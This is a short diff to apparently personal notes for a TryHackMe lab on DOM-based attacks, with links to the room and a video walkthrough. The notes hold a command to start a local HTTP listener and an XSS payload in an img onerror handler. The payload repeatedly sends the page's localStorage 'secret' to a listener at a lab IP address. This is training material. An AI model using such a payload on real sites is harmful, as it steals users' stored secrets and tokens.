@@ -1,3 +1,9 @@
+Below payload been used on TryHackMe room  DOM-Based Attacks
+
+https://tryhackme.com/room/dombasedattacks
+
+Video walk throuhg: https://youtu.be/5HATK-B04xs
+
 python -m http.server
 
 <img src=1 onerror="setInterval(() => {fetch('http://10.10.70.178:8000?secret=' + encodeURIComponent(localStorage.getItem('secret')), {method: 'GET'});}, 6000);">
